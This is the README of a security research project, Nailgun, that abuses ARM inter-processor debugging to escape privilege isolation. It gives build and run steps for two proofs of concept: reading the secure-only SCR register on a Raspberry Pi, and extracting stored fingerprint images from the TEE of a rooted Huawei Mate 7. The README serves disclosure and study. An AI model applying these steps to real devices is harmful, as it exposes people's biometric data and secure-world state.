# Nailgun: Break the privilege isolation in ARM devices

## Overview
Processors nowadays are consistently equipped with debugging features to facilitate the program debugging and analysis. Specifically, the ARM debugging architecture involves a series of CoreSight components and debug registers to aid the system debugging, but the security of the debugging features is under-examined since it normally requires physical access to use these features in the traditional debugging model.

The idea of Nailgun Attack is to misuse the debugging architecture with the inter-processor debugging model. In the inter-processor debugging model, a processor (debug host) is able to pause and debug another processor (debug target) on the same chip even when the debug target owns a higher privilege. With Nailgun, we are able to obtain sensitive information and achieve arbitrary payload execution in a high-privilege mode.

## Proof of Concept
We will make two PoCs available on Github:

### PoC #1: Reading  Secure Configuration Register with a kernel module.
#### Platform
- Deivce: Raspberry PI 3 Model B+ 
- Firmware: Raspbian GNU/Linux 9.6 (stretch)

#### Description
In this PoC, we we use a kernel module running in non-secure EL1 to read Secure Configuration Register (SCR), which is only accessiable in secure state, on Raspberry PI. The fold ```PoC/Read_SCR``` contains the source code and prebuild binaries for two kernel modules. The first kernel module _directly_read.ko_ read the SCR directly, which lead to segmentation fault. The kernel module _nailgun.ko_ leverages Nailgun attack to read the SCR

#### Prepare
If you are going to build the kernel module from the source code, you need to install the compile tools and kernel headers with the following command,
```
pi@raspberrypi:~/ $ sudo apt-get install build-essential raspberrypi-kernel-headers
```
Then, get into the source code fold, and compile the kernel module
```
pi@raspberrypi:~/ $ cd PoC/Read_SCR
pi@raspberrypi:~/PoC/Read_SCR $ make
```

#### Run
Use _insmod_ command to install the corresponding kernel module, and use _dmesg_ to check the kernel logs.
```
pi@raspberrypi:~/PoC/Read_SCR $ sudo insmod directly_read.ko
pi@raspberrypi:~/PoC/Read_SCR $ dmesg
pi@raspberrypi:~/PoC/Read_SCR $ sudo insmod nailgun.ko
pi@raspberrypi:~/PoC/Read_SCR $ dmesg
```
The value of the SCR can be found in the kernel log.

### PoC #2:  Extracting the fingerprint image.
#### Platform
- Deivce: Huawei Mate 7 (MT-L09)
- Firmware: MT7-L09V100R001C00B121SP05

#### Description
In this PoC, we use a kernel module running in non-secure EL1 to extract the fingerprint image
stored in TEE on Huawei Mate 7. The fold ```PoC/Fingerprint_Extraction``` contains the source code for the kernel module that extracts fingerprint data from TEE, a prebuild binary of the kernel module, and a python script to convert the extracted image data to a PNG file.

#### Prepare
- Make sure you have scanned a fingerprint with the fingerprint sensor.
- Enable USB debugging on your phone and connect it to your PC. (**Nailgun attack doesn't require physical access to the phone, the connection is only used for transferring the binary to the phone and moving the output log to the PC.**)
- Make sure you have root access on your phone.

#### Run
Firstly, push the prebuild binary into the phone
```
adb push nailgun.ko /sdcard/
```
Next, in the _adb shell_ console of the phone, install the kernel module
```
adb shell
shell@hwmt7:/ $ su
root@hwmt7:/ # insmod /sdcard/nailgun.ko
```
Check the kernel log with _dmesg_ command
```
root@hwmt7:/ # dmesg
```
If you can find the fingerprint data similar to this
```
<6>[   51.284149] [0.1, swapper/1] --------------------Fingerprint Start

```
then the PoC works.
Next, dump the kernel log to file, and extract the file from the phone to your PC
```
root@hwmt7:/ # dmesg > /sdcard/nailgun.log
root@hwmt7:/ # exit
shell@hwmt7:/ $ exit
adb pull /sdcard/nailgun.log .
```
Finally, use the python script to convert the fingerprint data to a PNG file
```
python log2image.py nailgun.log
```
You will find the extracted fingerprint images are stored into PNG files naming _fingerprint\_x.png_, in which _x_ means the index of the image.
